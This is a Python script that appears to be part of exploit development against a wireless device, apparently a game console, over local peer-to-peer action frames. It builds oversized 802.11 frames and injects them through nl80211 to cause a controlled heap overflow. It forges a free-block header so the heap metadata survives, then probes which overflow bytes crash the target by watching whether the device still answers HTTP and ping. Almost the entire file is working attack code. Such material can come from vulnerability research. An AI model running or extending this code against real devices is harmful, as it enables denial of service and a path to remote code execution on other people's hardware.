#!/usr/bin/env -S python3 -u
"""Test controlled overflow with correct free block header preservation.

Confirmed layout:
  parser+0x5D8: "padding" or used block (can be zeroed safely)
  parser+0x7AC: FREE block header (magic=FR, attr=0x0001, size=0x0020)

Key finding: body_size=0x800 with zero fill + correct free hdr = OK
But AAAA in the overflow region = CRASH.

This test narrows down WHICH bytes in the overflow region are sensitive.
The overflow region (body[0x57C:0x800]) maps to parser[0x5D8:0x85C].
"""

import os
import struct
import socket
import time
import subprocess
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
LP2P_HEADER = b"\x7f\x00\x22\xaa\x04\x01\x01\x01\x00\x00\x00\x00"


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:16]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


FREE_HDR = bytearray(24)
struct.pack_into("<H", FREE_HDR, 0, 0x4652)
struct.pack_into("<H", FREE_HDR, 2, 0x0001)
struct.pack_into("<I", FREE_HDR, 4, 0x0020)


def build_overflow_body(overflow_region):
    """Build body_size=0x800 with specific overflow content.

    overflow_region: bytes for body[0x57C:0x800] (0x284 bytes max).
    Free header at body[0x750:0x768] is auto-patched with correct values.
    """
    body_size = 0x800
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    struct.pack_into(">H", body, 0x1DA, 0x0100)

    # Write overflow region
    ovf = overflow_region[:0x284]
    body[0x57C:0x57C + len(ovf)] = ovf

    # Patch free block header at body[0x750:0x768]
    body[0x750:0x768] = FREE_HDR

    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def test(fam_id, ifindex, name, overflow, frame_count=80):
    if not check_alive():
        if not wait_alive(30):
            print(f"  {name:55s} → SKIP")
            return None

    body = build_overflow_body(overflow)
    frame = build_frame(body)

    for i in range(frame_count):
        err = send_frame(fam_id, ifindex, frame)
        if err != 0:
            break
        time.sleep(0.002)

    time.sleep(3)
    a1 = check_alive()
    time.sleep(5)
    a2 = check_alive()
    p2 = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                         capture_output=True).returncode == 0

    if a2 and p2:
        result = "OK"
    elif p2 and not a2:
        result = "HTTP_DOWN"
    else:
        result = "CRASH"

    print(f"  {name:55s} → {result}")
    return result


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE}, nl80211 family: {fam_id}")

    results = {}

    # Baseline: all zeros (confirmed OK)
    print("\n" + "="*65)
    print("  PHASE 1: Confirm baseline")
    print("="*65)
    r = test(fam_id, ifindex, "all_zeros", bytearray(0x284))
    results["baseline_zeros"] = r
    if r != "OK":
        time.sleep(15)
        wait_alive(30)

    # Phase 2: Binary search for which 64-byte chunk causes the crash
    # Overflow region = body[0x57C:0x800] = 0x284 bytes
    # Divided into ~10 chunks of ~64 bytes each
    # Set each chunk to 0x41 while rest remains 0, see which crashes
    print(f"\n{'='*65}")
    print("  PHASE 2: Which chunk crashes? (64-byte chunks, 0x41 fill)")
    print("="*65)

    chunk_size = 0x40
    num_chunks = (0x284 + chunk_size - 1) // chunk_size

    for i in range(num_chunks):
        start = i * chunk_size
        end = min(start + chunk_size, 0x284)
        # Skip the free header region (0x750-0x57C=0x1D4 to 0x768-0x57C=0x1EC)
        # Those bytes are auto-patched

        ovf = bytearray(0x284)
        for j in range(start, end):
            body_off = 0x57C + j
            # Don't corrupt the free header (auto-patched anyway)
            if 0x750 <= body_off < 0x768:
                continue
            ovf[j] = 0x41

        heap_start = 0x5D8 + start
        heap_end = 0x5D8 + end
        name = f"chunk_{i:02d}_0x41 (parser+0x{heap_start:03x}:0x{heap_end:03x})"
        r = test(fam_id, ifindex, name, bytes(ovf))
        results[f"chunk_{i}"] = r
        if r != "OK":
            time.sleep(15)
            wait_alive(30)

    # Phase 3: Based on crashes, narrow down to individual 8-byte fields
    print(f"\n{'='*65}")
    print("  PHASE 3: Critical field isolation (8-byte granularity)")
    print("="*65)

    crash_chunks = [i for i in range(num_chunks) if results.get(f"chunk_{i}") not in ("OK", None)]

    if not crash_chunks:
        print("  No crashes! Full 0x41 overflow is safe with correct free hdr.")
        # Try with fully controlled data
        ovf = bytes([0x41] * 0x284)
        r = test(fam_id, ifindex, "FULL_0x41 (all overflow = 0x41)", ovf)
        results["full_0x41"] = r
    else:
        for ci in crash_chunks:
            chunk_start = ci * chunk_size
            chunk_end = min(chunk_start + chunk_size, 0x284)

            for sub in range(chunk_start, chunk_end, 8):
                sub_end = min(sub + 8, chunk_end)
                ovf = bytearray(0x284)
                for j in range(sub, sub_end):
                    body_off = 0x57C + j
                    if 0x750 <= body_off < 0x768:
                        continue
                    ovf[j] = 0x41

                heap_off = 0x5D8 + sub
                name = f"  field_0x{heap_off:03x} (8B at overflow+0x{sub:03x})"
                r = test(fam_id, ifindex, name, bytes(ovf))
                results[f"field_0x{heap_off:03x}"] = r
                if r != "OK":
                    time.sleep(15)
                    wait_alive(30)

    # Summary
    print(f"\n{'='*65}")
    print("  SUMMARY")
    print("="*65)
    for k, v in results.items():
        marker = " ***" if v not in ("OK", None) else ""
        print(f"  {k:50s} → {v}{marker}")

    outfile = str(_LDN_ROOT / "evidence" / "action_frame_overflow" / "overflow_control_test.json")
    with open(outfile, "w") as f:
        json.dump({
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "results": results,
        }, f, indent=2)
    print(f"\n  Saved to {outfile}")


if __name__ == "__main__":
    main()
